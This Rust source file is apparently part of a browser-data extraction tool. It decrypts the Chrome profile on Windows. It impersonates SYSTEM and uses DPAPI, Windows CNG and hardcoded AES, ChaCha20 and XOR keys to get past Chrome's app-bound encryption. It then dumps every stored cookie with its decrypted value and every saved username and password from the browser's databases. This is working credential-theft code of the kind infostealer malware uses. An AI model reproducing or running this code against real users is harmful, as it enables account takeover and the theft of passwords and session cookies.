use crate::browser_extractor::{
    BrowserExtractor, BrowserInfo, Cookie, Credential, ExtractedData, ProfileData,
};
use crate::error::{convert_windows_error, BrowserVoyageError, BrowserVoyageResult};
use crate::windows::ImpersonationGuard;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use chacha20poly1305::ChaCha20Poly1305;
use hex;
use rusqlite::Connection;
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::env;
use std::fs;
use std::path::PathBuf;
use tracing::{debug, info, instrument};
use windows::core::w;
use windows::Win32::Security::Cryptography::{
    CryptUnprotectData, NCryptDecrypt, NCryptFreeObject, NCryptOpenKey, NCryptOpenStorageProvider,
    CERT_KEY_SPEC, CRYPT_INTEGER_BLOB, NCRYPT_FLAGS, NCRYPT_KEY_HANDLE, NCRYPT_PROV_HANDLE,
};

#[derive(Debug)]
struct ParsedKeyBlob {
    _header: Vec<u8>,
    flag: u8,
    iv: Vec<u8>,
    ciphertext: Vec<u8>,
    tag: Vec<u8>,
    encrypted_aes_key: Option<Vec<u8>>,
}

#[derive(Debug, Deserialize)]
struct LocalState {
    os_crypt: OsCrypt,
}

#[derive(Debug, Deserialize)]
struct OsCrypt {
    app_bound_encrypted_key: String,
}

#[derive(Debug)]
pub struct WindowsChromeExtractor {
    user_data_path: PathBuf,
}

impl WindowsChromeExtractor {
    pub fn new() -> Self {
        let user_profile = env::var("USERPROFILE").unwrap_or_default();
        let user_data_path =
            PathBuf::from(&user_profile).join("AppData/Local/Google/Chrome/User Data");

        Self { user_data_path }
    }

    #[instrument(skip(blob_data))]
    fn parse_key_blob(&self, blob_data: &[u8]) -> BrowserVoyageResult<ParsedKeyBlob> {
        let mut cursor = 0;

        if blob_data.len() < 8 {
            return Err(BrowserVoyageError::ParseError("Blob data too short".into()));
        }

        let header_len =
            u32::from_le_bytes(blob_data[cursor..cursor + 4].try_into().map_err(|_| {
                BrowserVoyageError::ParseError("Failed to parse header length".into())
            })?) as usize;
        cursor += 4;

        if cursor + header_len > blob_data.len() {
            return Err(BrowserVoyageError::ParseError(
                "Invalid header length".into(),
            ));
        }

        let header = blob_data[cursor..cursor + header_len].to_vec();
        cursor += header_len;

        let content_len =
            u32::from_le_bytes(blob_data[cursor..cursor + 4].try_into().map_err(|_| {
                BrowserVoyageError::ParseError("Failed to parse content length".into())
            })?) as usize;
        cursor += 4;

        if header_len + content_len + 8 != blob_data.len() {
            return Err(BrowserVoyageError::ParseError(
                "Invalid blob structure".into(),
            ));
        }

        let flag = blob_data[cursor];
        cursor += 1;

        debug!("Parsing key blob with flag: {}", flag);

        let mut parsed = ParsedKeyBlob {
            _header: header,
            flag,
            iv: Vec::new(),
            ciphertext: Vec::new(),
            tag: Vec::new(),
            encrypted_aes_key: None,
        };

        match flag {
            1 | 2 => {
                if cursor + 12 + 32 + 16 > blob_data.len() {
                    return Err(BrowserVoyageError::ParseError(format!(
                        "Invalid data for flag {flag}"
                    )));
                }
                parsed.iv = blob_data[cursor..cursor + 12].to_vec();
                cursor += 12;
                parsed.ciphertext = blob_data[cursor..cursor + 32].to_vec();
                cursor += 32;
                parsed.tag = blob_data[cursor..cursor + 16].to_vec();
            }
            3 => {
                if cursor + 32 + 12 + 32 + 16 > blob_data.len() {
                    return Err(BrowserVoyageError::ParseError(
                        "Invalid data for flag 3".into(),
                    ));
                }
                parsed.encrypted_aes_key = Some(blob_data[cursor..cursor + 32].to_vec());
                cursor += 32;
                parsed.iv = blob_data[cursor..cursor + 12].to_vec();
                cursor += 12;
                parsed.ciphertext = blob_data[cursor..cursor + 32].to_vec();
                cursor += 32;
                parsed.tag = blob_data[cursor..cursor + 16].to_vec();
            }
            _ => {
                return Err(BrowserVoyageError::ParseError(format!(
                    "Unsupported flag: {flag}"
                )))
            }
        }

        Ok(parsed)
    }

    #[instrument(skip(input_data))]
    fn decrypt_with_cng(&self, input_data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
        unsafe {
            let mut h_provider = NCRYPT_PROV_HANDLE::default();
            let provider_name = w!("Microsoft Software Key Storage Provider");

            NCryptOpenStorageProvider(&mut h_provider, provider_name, 0)
                .map_err(convert_windows_error)?;

            let mut h_key = NCRYPT_KEY_HANDLE::default();
            let key_name = w!("Google Chromekey1");

            NCryptOpenKey(
                h_provider,
                &mut h_key,
                key_name,
                CERT_KEY_SPEC(0),
                NCRYPT_FLAGS(0),
            )
            .map_err(convert_windows_error)?;

            let mut pcb_result = 0u32;
            NCryptDecrypt(
                h_key,
                Some(input_data),
                None,
                None,
                &mut pcb_result,
                NCRYPT_FLAGS(0x40), // NCRYPT_SILENT_FLAG
            )
            .map_err(convert_windows_error)?;

            let mut output = vec![0u8; pcb_result as usize];
            NCryptDecrypt(
                h_key,
                Some(input_data),
                None,
                Some(&mut output),
                &mut pcb_result,
                NCRYPT_FLAGS(0x40), // NCRYPT_SILENT_FLAG
            )
            .map_err(convert_windows_error)?;

            NCryptFreeObject(windows::Win32::Security::Cryptography::NCRYPT_HANDLE(
                h_key.0,
            ))
            .ok();
            NCryptFreeObject(windows::Win32::Security::Cryptography::NCRYPT_HANDLE(
                h_provider.0,
            ))
            .ok();

            output.truncate(pcb_result as usize);
            debug!("Successfully decrypted {} bytes with CNG", output.len());
            Ok(output)
        }
    }

    fn byte_xor(&self, ba1: &[u8], ba2: &[u8]) -> Vec<u8> {
        ba1.iter().zip(ba2.iter()).map(|(a, b)| a ^ b).collect()
    }

    #[instrument(skip(parsed_data))]
    fn derive_v20_master_key(&self, parsed_data: &ParsedKeyBlob) -> BrowserVoyageResult<Vec<u8>> {
        match parsed_data.flag {
            1 => {
                info!("Using AES-256-GCM decryption (flag 1)");
                let aes_key = hex::decode(
                    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787",
                )?;
                let cipher = Aes256Gcm::new_from_slice(&aes_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES: {e}")))
            }
            2 => {
                info!("Using ChaCha20-Poly1305 decryption (flag 2)");
                let chacha20_key = hex::decode(
                    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660",
                )?;
                let cipher = ChaCha20Poly1305::new_from_slice(&chacha20_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = chacha20poly1305::Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("ChaCha20: {e}")))
            }
            3 => {
                info!("Using AES-256-GCM with CNG decryption (flag 3)");
                let xor_key = hex::decode(
                    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390",
                )?;

                let encrypted_aes_key =
                    parsed_data.encrypted_aes_key.as_ref().ok_or_else(|| {
                        BrowserVoyageError::ParseError(
                            "Missing encrypted AES key for flag 3".into(),
                        )
                    })?;

                let _guard = ImpersonationGuard::new()?;
                let decrypted_aes_key = self.decrypt_with_cng(encrypted_aes_key)?;

                let xored_aes_key = self.byte_xor(&decrypted_aes_key, &xor_key);
                let cipher = Aes256Gcm::new_from_slice(&xored_aes_key)
                    .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
                let nonce = Nonce::from_slice(&parsed_data.iv);

                let mut combined = parsed_data.ciphertext.clone();
                combined.extend_from_slice(&parsed_data.tag);

                cipher
                    .decrypt(nonce, combined.as_ref())
                    .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES: {e}")))
            }
            _ => Err(BrowserVoyageError::ParseError(format!(
                "Unsupported flag: {}",
                parsed_data.flag
            ))),
        }
    }

    #[instrument(skip(data))]
    fn dpapi_unprotect(&self, data: &[u8]) -> BrowserVoyageResult<Vec<u8>> {
        unsafe {
            let data_in = CRYPT_INTEGER_BLOB {
                cbData: data.len() as u32,
                pbData: data.as_ptr() as *mut u8,
            };

            let mut data_out = CRYPT_INTEGER_BLOB::default();

            CryptUnprotectData(&data_in, None, None, None, None, 0, &mut data_out)
                .map_err(convert_windows_error)?;

            let result =
                std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();

            #[link(name = "kernel32")]
            extern "system" {
                fn LocalFree(hMem: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
            }

            LocalFree(data_out.pbData as *mut std::ffi::c_void);

            debug!("DPAPI decrypted {} bytes", result.len());
            Ok(result)
        }
    }

    #[instrument(skip(encrypted_value, master_key))]
    fn decrypt_chromium_value(
        &self,
        encrypted_value: &[u8],
        master_key: &[u8],
        host_key: Option<&str>,
    ) -> BrowserVoyageResult<String> {
        if encrypted_value.len() < 3 + 12 + 16 {
            return Err(BrowserVoyageError::ParseError(
                "Invalid encrypted value length".into(),
            ));
        }

        // Check for v10, v11, or v20 prefix (different Chrome versions)
        if &encrypted_value[..3] != b"v20"
            && &encrypted_value[..3] != b"v10"
            && &encrypted_value[..3] != b"v11"
        {
            return Err(BrowserVoyageError::ParseError(format!(
                "Unknown encryption prefix: {:?}",
                String::from_utf8_lossy(&encrypted_value[..3])
            )));
        }

        let nonce = &encrypted_value[3..15];
        let ciphertext = &encrypted_value[15..];

        let cipher = Aes256Gcm::new_from_slice(master_key)
            .map_err(|e| BrowserVoyageError::InvalidKeyLength(format!("{e:?}")))?;
        let nonce = Nonce::from_slice(nonce);

        let decrypted = cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| BrowserVoyageError::DecryptionFailed(format!("AES-GCM: {e}")))?;

        // For cookies, check if the first 32 bytes match the domain hash
        if let Some(host) = host_key {
            let mut hasher = Sha256::new();
            hasher.update(host.as_bytes());
            let computed_hash = hasher.finalize();

            if decrypted.len() >= 32 && computed_hash.as_slice() == &decrypted[..32] {
                return Ok(String::from_utf8(decrypted[32..].to_vec())?);
            }
        }

        // For passwords or if no domain hash match, return the full decrypted content
        Ok(String::from_utf8(decrypted)?)
    }

    fn extract_master_key(&self) -> BrowserVoyageResult<Vec<u8>> {
        let local_state_path = self.user_data_path.join("Local State");

        info!("Reading Chrome Local State file");
        let local_state_content = fs::read_to_string(&local_state_path)
            .map_err(|e| BrowserVoyageError::Io(format!("Failed to read Local State: {e}")))?;
        let local_state: LocalState = serde_json::from_str(&local_state_content)?;

        let app_bound_encrypted_key = local_state.os_crypt.app_bound_encrypted_key;
        let key_blob_encrypted_with_prefix = BASE64
            .decode(&app_bound_encrypted_key)
            .map_err(|_| BrowserVoyageError::Base64Error)?;

        if key_blob_encrypted_with_prefix.len() < 4
            || &key_blob_encrypted_with_prefix[..4] != b"APPB"
        {
            return Err(BrowserVoyageError::ParseError(
                "Invalid app_bound_encrypted_key prefix".into(),
            ));
        }

        let key_blob_encrypted = &key_blob_encrypted_with_prefix[4..];

        info!("Decrypting with SYSTEM DPAPI");
        let _guard = ImpersonationGuard::new()?;
        let key_blob_system_decrypted = self.dpapi_unprotect(key_blob_encrypted)?;
        drop(_guard);

        info!("Decrypting with user DPAPI");
        let key_blob_user_decrypted = self.dpapi_unprotect(&key_blob_system_decrypted)?;

        let parsed_data = self.parse_key_blob(&key_blob_user_decrypted)?;
        self.derive_v20_master_key(&parsed_data)
    }

    fn extract_cookies(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Cookie>> {
        let cookie_db_path = self.user_data_path.join("Default/Network/Cookies");

        info!("Connecting to Chrome cookie database");
        let conn = Connection::open_with_flags(
            &cookie_db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )?;

        let mut stmt =
            conn.prepare("SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure from cookies")?;
        let cookies = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
                row.get::<_, String>(3)?,
                row.get::<_, i64>(4)?,
                row.get::<_, bool>(5)?,
            ))
        })?;

        let mut extracted_cookies = Vec::new();

        for cookie in cookies {
            let (host_key, name, encrypted_value, path, expiry, is_secure) = cookie?;

            if encrypted_value.len() > 3
                && (&encrypted_value[..3] == b"v20"
                    || &encrypted_value[..3] == b"v10"
                    || &encrypted_value[..3] == b"v11")
            {
                match self.decrypt_chromium_value(&encrypted_value, master_key, Some(&host_key)) {
                    Ok(decrypted_value) => {
                        extracted_cookies.push(Cookie {
                            host: host_key.clone(),
                            name,
                            value: decrypted_value,
                            path,
                            expiry,
                            is_secure,
                        });
                    }
                    Err(e) => {
                        debug!("Failed to decrypt cookie {}/{}: {}", host_key, name, e);
                    }
                }
            }
        }

        info!("Successfully extracted {} cookies", extracted_cookies.len());
        Ok(extracted_cookies)
    }

    fn extract_credentials(&self, master_key: &[u8]) -> BrowserVoyageResult<Vec<Credential>> {
        let login_db_path = self.user_data_path.join("Default/Login Data");

        if !login_db_path.exists() {
            debug!("Login Data database not found at: {:?}", login_db_path);
            return Ok(Vec::new());
        }

        info!("Connecting to Chrome Login Data database");

        // Try to copy the database file if it's locked
        let temp_path = std::env::temp_dir().join("chrome_login_data_temp.db");
        let db_path = if Connection::open_with_flags(
            &login_db_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        )
        .is_err()
        {
            // Database is locked, copy it
            std::fs::copy(&login_db_path, &temp_path)
                .map_err(|e| BrowserVoyageError::Io(format!("Failed to copy Login Data: {e}")))?;
            &temp_path
        } else {
            &login_db_path
        };

        let conn =
            Connection::open_with_flags(db_path, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY)?;

        let mut stmt =
            conn.prepare("SELECT origin_url, username_value, password_value FROM logins")?;
        let credentials = stmt.query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        })?;

        let mut extracted_credentials = Vec::new();

        for credential in credentials {
            let (origin_url, username, encrypted_password) = credential?;

            if !encrypted_password.is_empty()
                && !origin_url.is_empty()
                && encrypted_password.len() > 3
                && (&encrypted_password[..3] == b"v20"
                    || &encrypted_password[..3] == b"v10"
                    || &encrypted_password[..3] == b"v11")
            {
                match self.decrypt_chromium_value(&encrypted_password, master_key, None) {
                    Ok(decrypted_password) => {
                        extracted_credentials.push(Credential {
                            url: origin_url,
                            username,
                            password: decrypted_password,
                        });
                    }
                    Err(e) => {
                        debug!("Failed to decrypt password for {}: {}", origin_url, e);
                    }
                }
            }
        }

        // Clean up temp file if we used it
        if db_path == &temp_path {
            let _ = std::fs::remove_file(&temp_path);
        }

        info!(
            "Successfully extracted {} credentials",
            extracted_credentials.len()
        );
        Ok(extracted_credentials)
    }
}

impl BrowserExtractor for WindowsChromeExtractor {
    fn name(&self) -> &str {
        "Chrome"
    }

    fn extract(&mut self) -> BrowserVoyageResult<ExtractedData> {
        let master_key = self.extract_master_key()?;
        let cookies = self.extract_cookies(&master_key)?;
        let credentials = self.extract_credentials(&master_key)?;

        let profile_data = ProfileData {
            name: "Default".to_string(),
            path: self.user_data_path.join("Default").display().to_string(),
            cookies,
            credentials,
        };

        Ok(ExtractedData {
            browser: BrowserInfo {
                name: "Chrome".to_string(),
                vendor: "Google".to_string(),
                platform: "Windows".to_string(),
            },
            profiles: vec![profile_data],
        })
    }
}
